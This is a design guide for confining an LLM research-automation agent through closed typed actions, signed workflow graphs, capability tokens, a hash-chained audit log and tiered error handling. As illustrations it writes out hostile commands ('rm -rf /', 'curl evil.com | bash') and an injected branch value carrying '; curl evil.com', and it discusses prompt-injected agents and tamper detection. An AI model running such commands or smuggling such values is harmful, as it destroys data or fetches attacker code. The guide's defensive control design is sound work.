# Agentic Workflow Design: Making Illegal Actions Infeasible

> A guide to building research automation where unsafe operations are
> **structurally impossible**, not merely discouraged.

---

## Table of Contents

1. [The Problem](#1-the-problem)
2. [Core Mental Model](#2-core-mental-model)
3. [Three Pillars](#3-three-pillars)
4. [Pillar 1 — Closed Action Set](#4-pillar-1--closed-action-set)
5. [Pillar 2 — Immutable Workflow Graph](#5-pillar-2--immutable-workflow-graph)
6. [Pillar 3 — Verifiable Execution](#6-pillar-3--verifiable-execution)
7. [Capability Provenance Chain](#7-capability-provenance-chain)
8. [RAS-Style Error Tiers](#8-ras-style-error-tiers)
9. [End-to-End Walkthrough](#9-end-to-end-walkthrough)
10. [What to Avoid, Leverage, Neglect, and Not Overdo](#10-what-to-avoid-leverage-neglect-and-not-overdo)
11. [Glossary](#11-glossary)

---

## 1. The Problem

Traditional automation gives agents access to a shell:

```
┌─────────┐        ┌─────────────┐        ┌──────────┐
│  Agent   │──cmd──▶│  Shell/SSH   │──exec─▶│  Remote  │
│ (LLM or  │  str   │  (anything   │        │  Machine │
│  script) │        │   goes)      │        │          │
└─────────┘        └─────────────┘        └──────────┘

  "rm -rf /"  ← perfectly valid command string
  "curl evil.com | bash"  ← also valid
```

The agent can compose *any* string.  Guardrails ("please don't do bad
things") are advice, not enforcement.  A prompt-injected or buggy agent
can still *represent* the dangerous command — it just hopes not to *choose*
it.

**Goal**: make it so the dangerous command *cannot be represented* in the
first place.

---

## 2. Core Mental Model

Think of two fundamentally different security postures:

```
  ┌──────────────────────────────────────────────────────────┐
  │              "Will Not"  vs  "Cannot"                    │
  ├────────────────────────┬─────────────────────────────────┤
  │  Guardrail (post-hoc)  │  Structural (by construction)  │
  │                        │                                 │
  │  Agent generates text  │  Agent generates typed actions  │
  │  Filter checks output  │  Only legal actions exist in    │
  │  Rejects bad ones      │  the vocabulary                 │
  │                        │                                 │
  │  "Don't run rm -rf"    │  rm -rf is not a representable  │
  │                        │  action in the system           │
  │                        │                                 │
  │  Relies on: detection  │  Relies on: design              │
  └────────────────────────┴─────────────────────────────────┘
```

This guide is about the right column.

The key insight comes from the [dottxt control-layer article][dottxt]:
compile constraints into the *generation process itself* so that
unauthorized actions are **non-generatable**, not merely caught after the
fact.  And from the [Linux kernel RAS architecture][ras]: classify errors
into severity tiers with deterministic escalation, don't just pass/fail.

[dottxt]: https://blog.dottxt.ai/control-layer-for-ai
[ras]: https://www.kernel.org/doc/html/next/admin-guide/ras.html

---

## 3. Three Pillars

Everything rests on three ideas:

```
  ┌─────────────────────────────────────────────────────┐
  │                                                     │
  │    ┌──────────────┐  ┌──────────────┐  ┌─────────┐ │
  │    │  1. Closed    │  │ 2. Immutable │  │ 3. Veri-│ │
  │    │   Action Set  │  │   Workflow   │  │  fiable │ │
  │    │              │  │    Graph     │  │  Execu- │ │
  │    │  Actions are │  │  The graph   │  │  tion   │ │
  │    │  functions,  │  │  of legal    │  │         │ │
  │    │  not strings │  │  transitions │  │  Every  │ │
  │    │              │  │  is fixed    │  │  run is │ │
  │    │  No free-    │  │  and signed  │  │  replay-│ │
  │    │  form shell  │  │              │  │  able   │ │
  │    └──────────────┘  └──────────────┘  └─────────┘ │
  │                                                     │
  │  Together: agent can only call known functions in   │
  │  known order with validated inputs, and we can      │
  │  prove it after the fact.                           │
  └─────────────────────────────────────────────────────┘
```

---

## 4. Pillar 1 — Closed Action Set

### What Is an Action?

An action is a **function with a typed signature**, not a shell command.

```
  ┌─────────────────────────────────────────────────────┐
  │                    Action                           │
  │                                                     │
  │  name:        Checkout                              │
  │  input:       { branch: string, sha?: string }      │
  │  precondition:  state == POD_READY                  │
  │  postcondition: state  = CHECKED_OUT                │
  │  side_effects:  [git_fetch, git_checkout]           │
  │  code_hash:   sha256:ab12cd...                      │
  │  emits:       [repo_checked_out@<sha>]              │
  │                                                     │
  └─────────────────────────────────────────────────────┘
```

Compare this with what the agent sees today:

```python
# CURRENT (open, dangerous)
task_run(cmd="cd /mnt/repo && git checkout main && pip install -e .")
#          ↑ arbitrary string — anything goes

# PROPOSED (closed, safe)
Checkout(branch="main", expect_sha="abc123")
#        ↑ typed fields — only these knobs exist
```

### The Closed Set

Every action the agent can ever invoke is pre-defined:

```
  ALLOWED_ACTIONS = {
      PodUp,            # provision remote machine
      Bootstrap,        # install system deps
      Checkout,         # clone/checkout repo at ref
      UploadManifest,   # upload sweep CSV
      SweepStart,       # launch training sweep
      SweepStatus,      # poll sweep progress
      FetchRun,         # download run artifacts
  }
```

There is no `ShellExec` or `RawCommand` in the set.  If the agent tries
to produce one, the broker rejects it at schema validation — or better,
the LLM's decoder masks never allow those tokens to be generated.

### Why Functions, Not Strings?

| Property | Shell String | Typed Function |
|----------|-------------|----------------|
| Input validation | Manual parsing | Schema-enforced |
| Side effects | Unbounded | Declared allow-list |
| Composition | Concatenation (`&&`, `;`) | Explicit graph edges |
| Auditing | Parse free text | Structured log |
| Injection risk | High | Zero (no eval) |

---

## 5. Pillar 2 — Immutable Workflow Graph

### What Is a Workflow?

A workflow is a **directed graph of states and legal transitions**, where
each edge is an action:

```
                    ┌──────────────────────────────────────────┐
                    │          Workflow: research_v1           │
                    │          id: sha256(spec)                │
                    │          status: SIGNED + LOCKED         │
                    └──────────────────────────────────────────┘

  ┌──────────┐  PodUp   ┌───────────┐  Bootstrap  ┌──────────────┐
  │   INIT   │─────────▶│ POD_READY │────────────▶│ BOOTSTRAPPED │
  └──────────┘          └───────────┘             └──────────────┘
                              │                         │
                              │ Checkout                │ Checkout
                              ▼                         ▼
                        ┌──────────────────────────────────┐
                        │          CHECKED_OUT              │
                        └──────────────────────────────────┘
                              │                    │
                   UploadManifest              FetchRun
                              │                    │
                              ▼                    │
                        ┌──────────────┐           │
                        │SWEEP_RUNNING │◀──────────┘
                        └──────────────┘
                              │
                          SweepStatus
                        (when all done)
                              │
                              ▼
                        ┌──────────────────┐
                        │ SWEEP_COMPLETED  │  ← terminal
                        └──────────────────┘
```

### Immutability

The workflow spec is **content-addressed and signed**:

```
  workflow_id = sha256(canonical_json(workflow_spec))
```

At runtime, the broker loads the spec **read-only**.  To change the
workflow (add an action, alter a transition), you must:

1. Create a **new** spec with a **new** hash.
2. Get it **signed** (human review / approval gate).
3. Deploy the new version.

In-flight mutation is impossible.  The running system references a
specific `workflow_id`; if the file on disk doesn't match the expected
hash, the broker refuses to start.

```
  ┌──────────────┐     load      ┌──────────────┐
  │ workflow.yaml │────────────▶│    Broker     │
  │ (on disk)     │              │               │
  └──────────────┘              │  if sha256 !=  │
                                │  expected:     │
                                │    HALT        │
                                └──────────────┘
```

### Why Not Just an FSM?

Your existing `workflow.sh` already has an FSM (`fsm_require_state`).
That's good — we keep it.  But the FSM alone checks `(state, command)`
pairs.  The immutable workflow graph adds:

| FSM alone | Workflow graph |
|-----------|---------------|
| State → allowed commands | State → allowed actions with typed inputs |
| Checks *current* state | Checks state + capability provenance |
| Mutable (edit the script) | Content-addressed + signed (tamper-evident) |
| No replay verification | Full replay from event log |

---

## 6. Pillar 3 — Verifiable Execution

### The Event Log

Every action call and result is appended to a **hash-chained event log**:

```
  Event 0 (genesis)
  ┌──────────────────────────────────────────────┐
  │ workflow_id: sha256:wf_abc...                │
  │ timestamp:   2026-02-10T10:00:00Z            │
  │ hash:        sha256(payload)  → H0           │
  │ prev_hash:   null                            │
  └──────────────────────────────────────────────┘
                      │
                      ▼
  Event 1 (action call)
  ┌──────────────────────────────────────────────┐
  │ action:      Checkout                        │
  │ input:       {branch: "main", sha: "abc123"} │
  │ state_before: POD_READY                      │
  │ state_after:  CHECKED_OUT                    │
  │ caps_consumed: [pod_ready]                   │
  │ caps_emitted:  [repo_checked_out@abc123]     │
  │ result:      {ok: true, sha: "abc123"}       │
  │ hash:        sha256(payload + H0)  → H1      │
  │ prev_hash:   H0                              │
  └──────────────────────────────────────────────┘
                      │
                      ▼
  Event 2 (action call)
  ┌──────────────────────────────────────────────┐
  │ action:      SweepStart                      │
  │ input:       {manifest_id: "mf_20260210"}    │
  │ state_before: CHECKED_OUT                    │
  │ state_after:  SWEEP_RUNNING                  │
  │ caps_consumed: [repo_checked_out@abc123,     │
  │                 manifest_signed@sha256:9f..]  │
  │ caps_emitted:  [sweep_started@sweep_001]     │
  │ result:      {ok: true}                      │
  │ hash:        sha256(payload + H1)  → H2      │
  │ prev_hash:   H1                              │
  └──────────────────────────────────────────────┘
                      │
                     ...
```

### The Verifier

A standalone tool replays the log against the workflow spec:

```
  ┌──────────────┐    ┌────────────────┐    ┌──────────────────┐
  │  Event Log   │───▶│   Verifier     │◀───│  Workflow Spec   │
  │  (append-    │    │                │    │  (signed, known  │
  │   only)      │    │  For each      │    │   hash)          │
  └──────────────┘    │  event:        │    └──────────────────┘
                      │                │
                      │  1. Hash chain │    Result:
                      │     intact?    │    ┌──────────────────┐
                      │  2. Transition │    │ ✓ VALID RUN      │
                      │     legal?     │    │   or             │
                      │  3. Caps       │    │ ✗ VIOLATION at   │
                      │     present?   │    │   event N:       │
                      │  4. Input      │    │   "SweepStart    │
                      │     schema ok? │    │    missing cap   │
                      │  5. Post-      │    │    manifest_     │
                      │     condition  │    │    signed"       │
                      │     held?      │    └──────────────────┘
                      └────────────────┘
```

This is the "proof" that a run was legal.  It can be run **after** the
fact by anyone with the log and the spec — no trust in the runtime
required.

---

## 7. Capability Provenance Chain

### The Problem Capabilities Solve

State alone isn't enough.  Consider:

```
  State: CHECKED_OUT
  Agent calls: SweepStart(manifest_id="fake_manifest")
```

The FSM allows `SweepStart` in state `CHECKED_OUT`.  But the manifest
was never uploaded — the agent hallucinated the ID.

### How Capabilities Work

Each successful action **emits** capability tokens.  Each subsequent
action **requires** specific tokens.  No token = no execution.

```
  ┌──────────────┐                    ┌──────────────────────┐
  │   Checkout   │───emits───────────▶│ repo_checked_out     │
  │              │                    │ @sha:abc123          │
  └──────────────┘                    └──────────────────────┘
                                                │
  ┌──────────────┐                              │ requires
  │ UploadManifest│───emits──┐                  │
  │              │           │                  │
  └──────────────┘           ▼                  ▼
                    ┌──────────────┐   ┌──────────────────┐
                    │ manifest_    │   │                  │
                    │ signed       │──▶│   SweepStart     │
                    │ @sha256:9f.. │   │   (requires      │
                    └──────────────┘   │    BOTH caps)    │
                                      └──────────────────┘
```

**Key properties:**
- Capabilities are **unforgeable** — minted only by the broker after a
  successful action, not by the agent.
- Capabilities are **specific** — `repo_checked_out@abc123` is bound to
  a specific commit SHA, not a generic "yes, checked out."
- Capabilities **expire** — tied to the workflow run; a cap from run N
  cannot be used in run N+1.

### Provenance Chain Example

```
  ── Run starts ──────────────────────────────────────────────

  Agent holds: (nothing)

  Step 1: Checkout(branch="main")
    Broker checks: state=POD_READY ✓, no caps required ✓
    Executor runs: git fetch + checkout
    Broker emits:  repo_checked_out@abc123
    Agent holds:   [repo_checked_out@abc123]

  Step 2: UploadManifest(csv_path="sweep.csv")
    Broker checks: state=CHECKED_OUT ✓, caps=[repo_checked_out] ✓
    Executor runs: upload + sha256 + provenance snapshot
    Broker emits:  manifest_signed@sha256:9f86d...
    Agent holds:   [repo_checked_out@abc123, manifest_signed@sha256:9f86d]

  Step 3: SweepStart(manifest_id="mf_20260210", timeout=21600)
    Broker checks: state=CHECKED_OUT ✓
                   caps=[repo_checked_out, manifest_signed] ✓
                   timeout in [60, 86400] ✓
    Executor runs: tmux sweep window via torchrun
    Broker emits:  sweep_started@sweep_001

  ── Illegal attempt ─────────────────────────────────────────

  Step 3-alt: SweepStart(manifest_id="fake")
    Broker checks: caps required = [manifest_signed@<digest>]
                   Agent holds manifest_signed@sha256:9f86d
                   but "fake" != "sha256:9f86d"
    → REJECTED: capability mismatch
    → This is not a "the agent chose wrong" situation.
      The agent literally cannot produce a valid manifest_signed
      capability for a manifest that was never uploaded.
```

---

## 8. RAS-Style Error Tiers

The Linux kernel's [RAS subsystem][ras] doesn't just pass/fail.  It
classifies errors into tiers with deterministic handling.  We steal this
idea wholesale.

### Error Classification

```
  ┌─────────────────────────────────────────────────────────────┐
  │                     Error Severity Tiers                    │
  ├───────────────┬──────────────────────┬──────────────────────┤
  │    Tier       │    Example           │    Response          │
  ├───────────────┼──────────────────────┼──────────────────────┤
  │               │                      │                      │
  │  Correctable  │  Transient SSH       │  Auto-retry (3x)    │
  │  (CE)         │  timeout, OOM on     │  Log counter         │
  │               │  small run, temp     │  Continue workflow   │
  │               │  disk full           │                      │
  │               │                      │                      │
  ├───────────────┼──────────────────────┼──────────────────────┤
  │               │                      │                      │
  │  Uncorrected  │  Single run fails    │  Isolate failed run  │
  │  (UE)         │  (NaN loss, CUDA     │  Mark run failed     │
  │               │  error), bad config  │  Continue other runs │
  │               │  in one sweep row    │  Alert operator      │
  │               │                      │                      │
  ├───────────────┼──────────────────────┼──────────────────────┤
  │               │                      │                      │
  │  Fatal        │  GPU hardware fault, │  Halt entire sweep   │
  │               │  filesystem corrupt, │  Preserve all logs   │
  │               │  torch not available │  Require human       │
  │               │                      │  intervention        │
  │               │                      │                      │
  ├───────────────┼──────────────────────┼──────────────────────┤
  │               │                      │                      │
  │  Policy       │  Unknown action,     │  Halt immediately    │
  │  Violation    │  capability forgery, │  Freeze event log    │
  │               │  hash mismatch,      │  Alert + lock out    │
  │               │  tampered log        │  agent               │
  │               │                      │                      │
  └───────────────┴──────────────────────┴──────────────────────┘
```

### Escalation Ladder

```
  Correctable errors
  ┌─────────┐    count++     ┌──────────────┐   threshold    ┌──────────┐
  │ Retry & │──────────────▶│  Track trend  │──────────────▶│ Escalate │
  │ continue│               │  (CE counter) │  exceeded      │ to UE    │
  └─────────┘               └──────────────┘               └──────────┘

  Key insight from kernel RAS: rising correctable error counts
  are a LEADING INDICATOR of imminent uncorrectable failure.

  Example: if SSH connections flap 5 times in 10 minutes,
  don't just retry — escalate.  The pod is probably dying.
```

### Where This Maps to Current Code

Your `workflow.sh` already has pieces of this:

| RAS concept | Current implementation | Gap |
|-------------|----------------------|-----|
| CE detection | `set -e` + retry in lium RC parsing | No counter/trend tracking |
| UE handling | `summary.json {ok: false}` per run | Doesn't isolate; halts sweep |
| Fatal | torch/CUDA checks at checkout | Only at startup, not runtime |
| Policy | `fsm_require_state` | No capability/hash verification |
| Counters | (missing) | Need per-tier structured counters |
| Escalation | (missing) | Need threshold-based promotion |

---

## 9. End-to-End Walkthrough

Here is a complete research automation run, from goal to verified
completion, showing every layer in action.

### Setup: The Artifacts

```
  ┌─────────────────────────────────────────────────────────┐
  │  Artifacts created BEFORE any run                       │
  │                                                         │
  │  workflow.yaml  ← defines states, transitions, actions  │
  │  actions/       ← one spec per action (input schema,    │
  │                    pre/post conditions, allowed effects) │
  │  sweep.csv      ← experiment manifest                   │
  │                                                         │
  │  All content-addressed:                                 │
  │    workflow_id = sha256(workflow.yaml)                   │
  │    action_id   = sha256(action_spec + code)             │
  └─────────────────────────────────────────────────────────┘
```

### Runtime: The Broker

```
  ┌──────────┐  ActionCall   ┌──────────────────────────┐  template  ┌──────────┐
  │          │  (typed IR)   │        BROKER             │  exec     │          │
  │  Agent   │──────────────▶│                           │──────────▶│ Executor │
  │  (LLM /  │               │  1. Schema valid?         │           │ (workflow│
  │  script) │               │  2. Workflow hash match?   │           │  .sh     │
  │          │               │  3. State transition ok?   │           │  fixed   │
  │          │◀──────────────│  4. Caps present & valid?  │◀──────────│  funcs)  │
  │          │  ActionResult │  5. Params in bounds?      │  result   │          │
  │          │  + new caps   │  6. Action code hash ok?   │           │          │
  └──────────┘               │                           │           └──────────┘
                             │  ALL pass → execute        │
                             │  ANY fail → reject + log   │
                             │                           │
                             │  7. Log event to chain     │
                             │  8. Emit caps if success   │
                             │  9. Classify errors (RAS)  │
                             └──────────────────────────┘
```

### Step by Step

```
  ┌─────────────────────────────────────────────────────────────┐
  │  Time   Agent emits              Broker validates & runs    │
  │  ─────  ─────────────────────    ─────────────────────────  │
  │                                                             │
  │  T0     (workflow_id: wf_abc)    Load spec, verify hash ✓  │
  │                                  State = INIT               │
  │                                                             │
  │  T1     PodUp(name="mhc-exp",   INIT→PodUp legal ✓         │
  │           gpu="A100",            Params in bounds ✓         │
  │           count=4)               Execute pod provisioning   │
  │                                  State → POD_READY          │
  │                                  Emit: pod_ready@pod123     │
  │                                                             │
  │  T2     Bootstrap()              POD_READY→Bootstrap ✓      │
  │                                  Caps: pod_ready ✓          │
  │                                  Execute system setup       │
  │                                  State → BOOTSTRAPPED       │
  │                                  Emit: bootstrapped@pod123  │
  │                                                             │
  │  T3     Checkout(                BOOTSTRAPPED→Checkout ✓    │
  │           branch="main",        Caps: bootstrapped ✓        │
  │           expect_sha="abc123")  Validate branch regex ✓     │
  │                                  Execute git checkout       │
  │                                  Verify SHA matches ✓       │
  │                                  State → CHECKED_OUT        │
  │                                  Emit: repo@abc123          │
  │                                                             │
  │  T4     UploadManifest(          CHECKED_OUT→Upload ✓       │
  │           csv="sweep.csv")       Caps: repo@abc123 ✓        │
  │                                  Upload + hash manifest     │
  │                                  Snapshot provenance copy   │
  │                                  Emit: manifest@sha256:9f   │
  │                                                             │
  │  T5     SweepStart(              CHECKED_OUT→SweepStart ✓   │
  │           manifest_id=           Caps: repo@abc123 ✓        │
  │             "sha256:9f",               manifest@9f ✓        │
  │           timeout=21600)         Timeout in [60,86400] ✓    │
  │                                  Launch tmux sweep          │
  │                                  State → SWEEP_RUNNING      │
  │                                  Emit: sweep@sweep_001      │
  │                                                             │
  │  T6     SweepStatus()            SWEEP_RUNNING→Status ✓     │
  │                                  Caps: sweep@sweep_001 ✓    │
  │                                  Read summary files         │
  │                                  Return: 3/5 ok, 1 running  │
  │                                                             │
  │  T7     (wait...)                                           │
  │                                                             │
  │  T8     SweepStatus()            Returns: 5/5 ok            │
  │                                  State → SWEEP_COMPLETED    │
  │                                                             │
  │  T9     FetchRun(run_id="r3")    SWEEP_COMPLETED→Fetch ✓    │
  │                                  Caps: sweep@sweep_001 ✓    │
  │                                  Download + extract          │
  │                                                             │
  └─────────────────────────────────────────────────────────────┘
```

### Illegal Scenarios (All Infeasible)

```
  ┌─────────────────────────────────────────────────────────────┐
  │  Scenario                  Why it is infeasible             │
  │  ────────────────────────  ──────────────────────────────── │
  │                                                             │
  │  1. Agent emits:           "ShellExec" is not in the        │
  │     ShellExec(cmd=         action set.  Schema validation   │
  │       "rm -rf /")          rejects before any execution.    │
  │                            With decoder constraints, the    │
  │                            LLM cannot even generate this    │
  │                            token sequence.                  │
  │                                                             │
  │  2. Agent calls            Broker checks state: POD_READY.  │
  │     SweepStart in          Allowed actions for POD_READY:   │
  │     POD_READY state        [Bootstrap, Checkout].           │
  │                            SweepStart not in set → REJECT.  │
  │                                                             │
  │  3. Agent calls            SweepStart requires capability   │
  │     SweepStart with        manifest_signed@<digest>.        │
  │     fake manifest_id       Agent never ran UploadManifest,  │
  │                            so no such cap exists → REJECT.  │
  │                            Even if agent guesses a digest,  │
  │                            caps are broker-minted, not      │
  │                            agent-provided.                  │
  │                                                             │
  │  4. Agent calls            Checkout input schema:           │
  │     Checkout(branch=       branch must match regex          │
  │       "; curl evil.com")   ^[A-Za-z0-9._/-]+$              │
  │                            Semicolons not in charset        │
  │                            → REJECT at param validation.    │
  │                            No string interpolation into     │
  │                            shell ever happens (fixed        │
  │                            templates only).                 │
  │                                                             │
  │  5. Someone edits          Broker computes sha256 of spec   │
  │     workflow.yaml to       on load.  Hash ≠ expected        │
  │     add ShellExec action   workflow_id → HALT.  The edit    │
  │                            created a new spec that isn't    │
  │                            in the signed allow-list.        │
  │                                                             │
  │  6. Someone deletes        Verifier replays hash chain.     │
  │     an event from the      Event N+1's prev_hash won't     │
  │     log to hide a          match sha256(event N-1).         │
  │     failed run             Chain break detected → INVALID.  │
  │                                                             │
  └─────────────────────────────────────────────────────────────┘
```

---

## 10. What to Avoid, Leverage, Neglect, and Not Overdo

### Avoid

| Trap | Why | Instead |
|------|-----|---------|
| Free-form `--cmd` in autonomous mode | Defeats all structural safety | Fixed action templates only |
| Runtime-mutable workflow spec | Agent or bug can expand its own powers | Content-addressed + signed specs |
| "Policy in prompts" | LLM can ignore/be injected around prompts | Compiled validators external to LLM |
| Ambient authority | Actions inherit full host/env permissions | Declared `effects_allow` per action |
| Silent failures | Undetected errors compound | Structured error tiers + counters |

### Leverage (You Already Have This)

| Existing Asset | Where | How to Upgrade |
|---------------|-------|----------------|
| FSM state gates | `workflow.sh:fsm_require_state` | Add capability checks to transitions |
| Manifest provenance | `_manifests/` + timestamp copies | Content-address and sign manifests |
| Status lifecycle | `status.json` (pending→running→ok/failed) | Feed into RAS error classifier |
| Input validation | `validate_id`, integer checks | Extend to full action input schemas |
| Fail-fast shell | `set -euo pipefail` | Map exit codes to RAS tiers |
| Immutable-repo intent | CSV to outputs, not checkout | Formalize as broker-level rule |

### Often Neglected (Despite Lots of Work)

| Neglected Area | Symptoms | Fix |
|---------------|----------|-----|
| **Postcondition verification** | "Action succeeded" but output is garbage | Verify postconditions (SHA matches, files exist, loss is finite) |
| **Capability expiry/revocation** | Stale caps from crashed runs reused | Scope caps to run ID + TTL |
| **Negative-path testing** | Only test happy paths | Systematically test every illegal scenario in your table |
| **"Why denied" telemetry** | Operators see "REJECTED" with no context | Log which specific check failed and what was expected vs actual |
| **Replay/verifier tooling** | Logs exist but nobody ever replays them | Build `verify-run` CLI; run it in CI after every sweep |
| **Correctable error trends** | Individual retries succeed, systemic degradation invisible | Track CE counters; alert on rising rates |

### Easy to Overdo

| Over-Engineering Trap | Symptom | Right-Sizing |
|----------------------|---------|---------------|
| Ultra-granular capabilities | 50 cap types, nobody understands the matrix | Start with 5-7 caps matching your real actions |
| Approval gates everywhere | Every action needs human sign-off; throughput → 0 | Gate only spec changes, not every call |
| Custom DSL for policy | Months building a language before running experiments | YAML/JSON specs + a validator function |
| Fail-hard on everything | Transient SSH glitch halts entire 48-hour sweep | CE tier: retry 3x, then escalate; don't halt for flaps |
| Formal verification | Proving properties in Coq before having a working broker | Deterministic replay verifier first; formalize later if needed |
| Signed everything | Every log line needs PKI signatures | Sign the spec + chain-hash events; individual line signing is overkill |

---

## 11. Glossary

| Term | Definition |
|------|-----------|
| **Action** | A function with typed inputs, declared pre/post conditions, and allowed side effects. The atomic unit of work. |
| **Action IR** | "Intermediate Representation" — the structured JSON object the agent emits instead of shell commands. |
| **Broker** | The validation + dispatch layer between agent and executor. Enforces all policy checks. |
| **Capability (cap)** | A token minted by the broker after a successful action. Proves something happened. Required by downstream actions. |
| **Content-addressed** | Identified by the hash of its contents. Changing contents changes identity. Ensures immutability. |
| **CE / UE / Fatal** | Error tiers borrowed from Linux RAS: Correctable (auto-handle), Uncorrected (isolate), Fatal (halt). |
| **Closed action set** | The finite, pre-defined list of actions an agent can invoke. No action outside this set is representable. |
| **Decoder constraint** | Masking LLM token probabilities at generation time so illegal token sequences cannot be produced. |
| **Event log** | Append-only, hash-chained record of every action call and result. The proof artifact. |
| **FSM** | Finite State Machine — the set of states and legal transitions. |
| **Hash chain** | Each event includes `prev_hash = sha256(previous_event)`, forming a tamper-evident linked list. |
| **Policy violation** | An attempt to perform an action that no legal state/capability/input combination permits. Always halts. |
| **Postcondition** | A check that runs *after* an action to verify it actually achieved what it claimed. |
| **Provenance** | The chain of evidence showing how an artifact was produced (which actions, which inputs, which run). |
| **RAS** | Reliability, Availability, Serviceability — Linux kernel error-handling architecture. |
| **Verifier** | A tool that replays an event log against a workflow spec to prove the run was legal. |
| **Workflow spec** | The immutable, signed definition of states + transitions + actions that governs a run. |

---

## Further Reading

- [A Control Layer for AI](https://blog.dottxt.ai/control-layer-for-ai) — dottxt's case for compiling constraints into generation
- [Linux Kernel RAS](https://www.kernel.org/doc/html/next/admin-guide/ras.html) — error classification and deterministic escalation
- [Hyper-Connections paper](https://arxiv.org/abs/2409.19606) — the research this automation serves
- [mHC paper](https://arxiv.org/abs/2512.24880) — manifold-constrained variant

---

*This document is a living design reference.  The workflow spec and
action definitions it describes should be implemented incrementally:
start with the broker + 5 actions + event log, then add capabilities
and the verifier once the basic loop is battle-tested.*
